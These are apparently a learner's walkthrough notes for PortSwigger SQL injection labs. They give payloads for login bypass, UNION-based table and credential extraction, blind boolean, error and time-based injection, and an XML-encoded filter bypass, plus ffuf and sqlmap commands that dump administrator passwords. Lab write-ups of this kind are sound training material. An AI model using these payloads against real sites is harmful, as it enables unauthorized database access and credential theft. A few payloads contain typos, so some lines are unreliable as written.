#refer sql_cheat_sheet to know the exact keywords to type in payload to get the correct output | url -- [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) 
# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
It says it contains a vulnerability in the product category filter 
# Solution 
1. select any category 
2. intercept the traffic via Burp Suite 
3. you will see the url like this -->  GET /filter?category=Accessories
4. change the category to Gifts and print all the content it ! 
5. new url should look like this { GET /filter?category=Gifts'+OR+1=1-- } 
# Lab: SQL injection vulnerability allowing login bypass
need to register as administrator 
# Solution 
1. open  "My Account" 
2. type --> ( x' OR 1=1-- ) in both username and password box and hit "enter" 
# Lab: SQL injection attack, querying the database type and version on Oracle
we are dealing with the oracle databse here, you can search how to find table_info on the internet  
# Solution
1. check if any payload is working 
2. you see this /filter?category= , try embedding your sql_injection here ! 
3. injection = category=x'+UNION+SELECT+'abc','def'+FROM+dual-- 
4. you will see abc & def printed on the screen , hence the sql injection works 
5. now time to check the version_info 
6. injection = category=x'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- 
# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
this requires how to check for 
# Solution 
1. check if payload is working 
2. in /fitler?category= X'+UNION+SELECT+'abc','def'#  (if this prints abc,def : it's a success) 
3. now injection = x'+UNION+SELECT+@@version,+NULL# 
4. '#' comments out all things beyond playload and only prints what is asked ! 
# Lab: SQL injection attack, listing the database contents on non-Oracle databases
this requires to grep "users_info" from the table , so first need to find out what are the contents of the table 
# Solution 
1. in /filter?category=x'+union+select+table_name,+null+from+information_schema.tables-- 
2. get all the table_info and find user column to know username and password 
3. in /filter?category=x'+union+select+column_name,+null+from+information_schema.columns+where+table_name='user_column_name'-- 
4. if you see "username" & "password" column there you are in the right direction 
5. now here's how to print username and password from the column ; 
6. category=x'+union+select+username,+pasword+from+user_column_name-- 
7. get admin credentials , and login 
# Lab: SQL injection attack, listing the database contents on Oracle
entire logic is same as the above lab , just replace 
1. "information_schema.tables" with "all_tables" 
2. "information_schema.columns" with "all_tab_columns" 
# Lab: SQL injection UNION attack, determining the number of columns returned by the query
we need to find out after how many columns does our sql injection works 
# Solution
1. in the url we type , ..category=x'+union+select+null--  | you'll see it throws error 
2. so now we try to keep on adding the "null" char inorder to know the url limit ! 
3. new_url = ..category=x'+union+select+null,null,null-- 
# Lab: SQL injection UNION attack, finding a column containing text
we need to find the specific word mentioned on the webpage , logic same like above lab 
# Solution 
1. we type this ..category=x'+union+select+null,null,null-- 
2. then we find which of these 3 null can print characters on the site 
3. try ..category=x'+union+select+'a',null,null-- 
4. 'a' replace it with every null , once you know which one prints the characters , put your ($word) in place of that null in the url and press "enter" 
# Lab: SQL injection UNION attack, retrieving data from other tables
exact same logic as the above labs 
# Solution
1. url - ..category=x'+union+select+null,null-- | it prints 
2. replace null,null and get table_info then column_name and finally username, password 
3. final url - category=x'+union+select+username,+password+form+users-- 
# Lab: SQL injection UNION attack, retrieving multiple values in a single column
same solution as above 

# Lab: Blind SQL injection with conditional responses
this requires patience 
# Solution
1. after changing the url perfectly to get the username & password, you might have come to the conclusion that this is not the right approach to crack the password , try this then 
2. you will see no matter where you go inside the website the "TrackingId" remains the same throughtout the session
3. so rather than changing url which gives nothing , try manipulating the "TrackingId" 
4. How to check if we are getting the correct response
5. you will see "Welcome Back" everytime our condition match with the site so,
6. `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a` >> this tell yes there is administrator 
7. TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
8. in the above injection try changing "password_length" and check if you are getting "Welcome back" in the reponse
9. time to use `ffuf` in terminal and find password in snap 
10. use this --> `ffuf -response admin.txt -http2 -mode clusterbomb -w one.txt:FUZZ1 -w two.txt:FUZZ2 -mr "Welcome back" -v` 
11. admin.txt = your entire intercepted request , with FUZZ1 and FUZZ2 at your variables defined , one.txt (i.e 1-20) , two.txt (i.e a-z,A-Z,0-9) 
# Lab: Blind SQL injection with conditional errors
same as above , but we need to create condition ( "True" or "False" ) to know we are going in the right direction 
as the condition will throw some error and we'll catch it to get the password 
1. TrackingId=xyz' (error) , TrackingId=xyz'' (no-error) 
2. TrackingId=xyz'||(SELECT '')||' (error) , TrackingId=xyz'||(SELECT '' FROM dual)||' (no-error) {means it is using a oracle database} , look in the cheatsheet you will find a way to make the condition 
3. TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||' (error) {means sql query is being processed in the backend } 
4. condition --> 
	1. TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'  >> (error) 
	2. TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' >> (no-error)
	3. error tells the condition is true , and no-error tell the condition is false 
5. `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` >> from this we can find out the length of the password 
6. time to use `ffuf` to findout the password of admininstrator 
7. TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' 
8. copy the above modified intercepted message and make a admin.txt file out of it , along with one.txt(1-20) , two.txt(a-z,A-Z,0-9) and type this 
9. `ffuf -request admin.txt -http2 -mode clusterbomb -w one.txt:FUZZ1 -w two.txt:FUZZ2 -mc 500 -v`
10. match the keywords with their respective positions and submit the password ! 
# Lab: Visible error-based SQL injection
we will throw password using the error message on the screen 
# Solution 
1. check how the TrackingId is behaving 
2. TrackingId=ogAZZfxtOKUELbuJ' (error) , TrackingId=ogAZZfxtOKUELbuJ'-- (no-error)
3. TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)-- >> this throws the error condition must be a boolean expression 
4. TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)-- | now its correct 
5. TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)-- >> need to limit the characters 
6. TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- >> you'll see 'administrator'
7. TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- >> you'll see 'password' 
# Lab: Blind SQL injection with time delays
delay the website loading time 
# Solution 
1. intercept the request and type this 
2. TrackingId=x'||pg_sleep(10)-- 
# Lab: Blind SQL injection with time delays and information retrieval
too much time taking lab , we will do it with the least time-taking method 
# Solution 
1. we use sql map on our terminal and type the following command to get our result 
2. intercept the traffic on burp suite and send it to the *Repeater* 
3. command -->
		```sqlmap -u "host_address" \
       --cookie="TrackingId=*; session=session_id" \
       --dbms=PostgreSQL \
       --technique=T \
       --time-sec=10 \
       --threads=1 \
       --batch \
       --retries=1 \
       --level=3 \
       --no-cast \
       --dump -T users -C username,password \
       --where="username='administrator'"
		```
4. after a successful injection it gives us the username and password as required ! 
# Lab: SQL injection with filter bypass via XML encoding
in this lab we need to POST to get the credentials 
# Solution
1. capture  POST /product/stock traffic and send to repeater , on website you know you can change product_id and for each product and there are 3 stores {london , paris , milan } so '3' store id , so in 'store_id' switch options lies between {1-3} , more than that will give error 
2. you can check the logic too , check if for productId=1 , storeid=2 or storeid=1+1 gives the same result 
3. now time to trick store_id into throwing outputs 
4. if you type `<storeid> 1 union select username <storeid> ` , this block the request , sql injection detected we need to change the way we send payload , let's encode this and then see the difference 
5. i recommend "hackvertor" extension , and 'encode' your string in "**dec_entities**" , will look like these 
```json
<@dec_entities>1 union select username</@dec_entities>
```
6. when you use the above it might give '0' units or nothing 
7. try this payload instead to find out username and password 
```json
<@dec_entities>1 union select username|| '~' || password FROM users</@dec_entities>
```
8. `~` will be used as a separator for username~password , and output would be like this 
```text
administrator~glmgo92smh85fiqe9dhz
carlos~ilz9bdf8r3ui6ujhifzd
wiener~iacopay4ffk7hzjc9u8b
```
9. copy-paste your admin creds in my-account login 